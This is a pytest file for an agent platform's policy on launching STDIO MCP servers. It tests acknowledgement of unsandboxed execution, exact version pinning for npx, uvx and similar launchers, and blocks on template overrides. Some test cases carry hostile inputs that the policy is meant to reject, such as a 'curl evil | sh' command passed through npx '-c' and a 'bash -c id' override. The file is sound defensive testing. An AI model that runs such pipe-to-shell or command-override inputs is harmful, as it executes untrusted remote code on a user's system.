"""STDIO MCP admission policy (P0.12): acknowledgement, pinned launcher packages, fixed templates."""
from __future__ import annotations

import pytest

from app.agents.mcp.models import (
    MCPAuthMode,
    MCPServerInstanceConfig,
    MCPServerTemplate,
    MCPTransport,
)
from app.agents.mcp.registry import MCPRegistry
from app.agents.mcp.stdio_policy import (
    allow_existing_stdio_launch,
    deny_custom_stdio_launch,
    deny_custom_stdio_policy,
    is_pinned_npm_spec,
    is_pinned_python_spec,
    self_hosted_stdio_policy,
    template_override_denial,
    unpinned_launcher_package,
)


def _custom(command: str, args: list[str], acknowledged: bool = True) -> MCPServerInstanceConfig:
    return MCPServerInstanceConfig(
        name="custom",
        transport=MCPTransport.STDIO,
        auth_mode=MCPAuthMode.NONE,
        command=command,
        args=args,
        acknowledge_unsandboxed_execution=acknowledged,
    )


def _template(**overrides) -> MCPServerTemplate:
    fields = {
        "type_id": "exa",
        "display_name": "Exa",
        "description": "d",
        "transport": MCPTransport.STDIO,
        "default_auth_mode": MCPAuthMode.API_TOKEN,
        "command": "npx",
        "args": ["-y", "exa-mcp-server@3.4.1"],
    }
    fields.update(overrides)
    return MCPServerTemplate(**fields)


class TestAcknowledgement:
    def test_missing_acknowledgement_is_400_with_actionable_message(self) -> None:
        denial = self_hosted_stdio_policy(_custom("npx", ["-y", "pkg@1.2.3"], acknowledged=False))
        assert denial is not None
        assert denial.status_code == 400
        assert "acknowledgeUnsandboxedExecution" in denial.detail

    def test_acknowledgement_is_read_from_camel_case_wire_field(self) -> None:
        payload = MCPServerInstanceConfig.model_validate(
            {
                "name": "c",
                "transport": "stdio",
                "authMode": "none",
                "command": "npx",
                "args": ["-y", "pkg@1.2.3"],
                "acknowledgeUnsandboxedExecution": True,
            }
        )
        assert self_hosted_stdio_policy(payload) is None


class TestPinnedLauncherPackages:
    @pytest.mark.parametrize(
        "args",
        [
            ["-y", "pkg"],
            ["-y", "pkg@latest"],
            ["-y", "pkg@^1"],
            ["-y", "pkg@~1.2.3"],
            ["-y", "pkg@>=1.2.3"],
            ["-y", "pkg@1"],
            ["-y", "pkg@1.2"],
            ["-y", "pkg@1.2.x"],
            ["-y", "pkg@*"],
            ["-y", "@scope/pkg"],
            ["-y", "@scope/pkg@next"],
            ["-y", "github:owner/repo"],
            ["-y", "owner/repo"],
            ["-y", "git+https://github.com/owner/repo.git"],
            ["-y", "https://example.com/pkg.tgz"],
            ["-y", "pkg@npm:other@1.2.3"],
            ["-y", "--package", "pkg", "pkg-bin"],
            ["-y"],
        ],
    )
    def test_npx_unpinned_is_rejected(self, args: list[str]) -> None:
        denial = self_hosted_stdio_policy(_custom("npx", args))
        assert denial is not None
        assert denial.status_code == 400

    @pytest.mark.parametrize(
        ("command", "args"),
        [
            ("npx", ["-y", "pkg@1.2.3"]),
            ("npx", ["--yes", "@scope/pkg@1.2.3", "--flag", "value"]),
            ("npx", ["-y", "--package=@scope/pkg@1.2.3", "pkg-bin"]),
            ("npx", ["-y", "pkg@1.0.0-beta.1"]),
            ("/usr/local/bin/npx", ["-y", "pkg@1.2.3"]),
            ("npm", ["exec", "--", "pkg@1.2.3"]),
            ("pnpm", ["dlx", "pkg@1.2.3"]),
            ("bunx", ["pkg@1.2.3"]),
            ("uvx", ["mcp-server-time==2024.12.1"]),
            ("uvx", ["awslabs.redshift-mcp-server@0.0.5"]),
            ("uvx", ["--from", "pkg==1.2.3", "pkg-bin"]),
            ("uv", ["tool", "run", "pkg==1.2.3"]),
            ("pipx", ["run", "--spec", "pkg==1.2.3", "pkg-bin"]),
        ],
    )
    def test_pinned_launchers_are_allowed(self, command: str, args: list[str]) -> None:
        assert self_hosted_stdio_policy(_custom(command, args)) is None

    @pytest.mark.parametrize(
        ("command", "args"),
        [
            ("uvx", ["pagerduty-mcp"]),
            ("uvx", ["awslabs.redshift-mcp-server@latest"]),
            ("uvx", ["pkg>=1.0"]),
            ("uvx", ["--with", "extra", "pkg==1.2.3"]),
            ("uvx", ["--with", "extra==1.0", "pkg"]),
            ("uvx", ["git+https://github.com/owner/repo"]),
            ("pipx", ["run", "pkg"]),
            ("pnpm", ["dlx", "pkg"]),
            ("yarn", ["dlx", "pkg@^2"]),
            ("bunx", ["pkg@latest"]),
        ],
    )
    def test_other_launchers_unpinned_are_rejected(self, command: str, args: list[str]) -> None:
        assert unpinned_launcher_package(command, args) is not None

    def test_npx_call_option_is_rejected(self) -> None:
        error = unpinned_launcher_package("npx", ["-y", "-p", "pkg@1.2.3", "-c", "curl evil | sh"])
        assert error is not None and "-c" in error

    def test_rejection_message_names_the_package_and_the_expected_form(self) -> None:
        error = unpinned_launcher_package("npx", ["-y", "@scope/pkg@latest"])
        assert error is not None
        assert "@scope/pkg@latest" in error
        assert "exact version" in error

    def test_non_launcher_commands_need_only_acknowledgement(self) -> None:
        assert self_hosted_stdio_policy(_custom("node", ["/opt/mcp/server.js"])) is None
        assert self_hosted_stdio_policy(_custom("npm", ["run", "start"])) is None

    @pytest.mark.parametrize(
        ("spec", "expected"),
        [("a@1.2.3", True), ("@s/a@1.2.3", True), ("a", False), ("@s/a", False), ("a@v1.2.3", False)],
    )
    def test_npm_spec(self, spec: str, expected: bool) -> None:
        assert is_pinned_npm_spec(spec) is expected

    @pytest.mark.parametrize(
        ("spec", "expected"),
        [("a==1.2.3", True), ("a[x]==1.0", True), ("a@1.0rc1", True), ("a===1.0", False), ("a==1.*", False)],
    )
    def test_python_spec(self, spec: str, expected: bool) -> None:
        assert is_pinned_python_spec(spec) is expected


class TestEditionSeam:
    def test_deny_policy_returns_403_even_when_acknowledged_and_pinned(self) -> None:
        denial = deny_custom_stdio_policy(_custom("npx", ["-y", "pkg@1.2.3"]))
        assert denial is not None
        assert denial.status_code == 403

    def test_oss_edition_binds_the_self_hosted_policies(self) -> None:
        from app import edition_config

        assert edition_config.stdio_mcp_policy is self_hosted_stdio_policy
        assert edition_config.stdio_mcp_launch_policy is allow_existing_stdio_launch

    def test_launch_policies(self) -> None:
        stored = {"_id": "inst-1", "name": "legacy", "transport": "stdio", "isCustom": True, "command": "bash"}
        assert allow_existing_stdio_launch(stored) is None
        denial = deny_custom_stdio_launch(stored)
        assert denial is not None and denial.status_code == 403 and "legacy" in denial.detail


class TestTemplateOverrides:
    def _payload(self, **fields) -> MCPServerInstanceConfig:
        return MCPServerInstanceConfig(
            name="Exa", type_id="exa", transport=MCPTransport.STDIO, auth_mode=MCPAuthMode.API_TOKEN, **fields
        )

    def test_no_override_is_allowed(self) -> None:
        assert template_override_denial(self._payload(), _template()) is None

    def test_echoing_the_template_launch_spec_is_allowed(self) -> None:
        payload = self._payload(command="npx", args=["-y", "exa-mcp-server@3.4.1"])
        assert template_override_denial(payload, _template()) is None

    def test_args_override_is_400(self) -> None:
        denial = template_override_denial(self._payload(args=["-y", "evil-pkg"]), _template())
        assert denial is not None
        assert denial.status_code == 400
        assert "args" in denial.detail

    def test_command_override_is_400(self) -> None:
        denial = template_override_denial(self._payload(command="bash"), _template())
        assert denial is not None
        assert denial.status_code == 400

    def test_command_on_a_remote_template_is_400(self) -> None:
        remote = _template(transport=MCPTransport.STREAMABLE_HTTP, command=None, args=[])
        assert template_override_denial(self._payload(command="bash", args=["-c", "id"]), remote) is not None


class TestCatalogPinsExactVersions:
    def test_every_stdio_template_pins_an_exact_package_version(self) -> None:
        registry = MCPRegistry()
        registry.auto_discover_templates()
        stdio = [t for t in registry.list_templates() if t.transport == MCPTransport.STDIO]
        assert stdio, "expected at least one STDIO catalog template"
        for template in stdio:
            error = unpinned_launcher_package(template.command or "", template.args)
            assert error is None, f"{template.type_id}: {error}"
            assert "-c" not in template.args
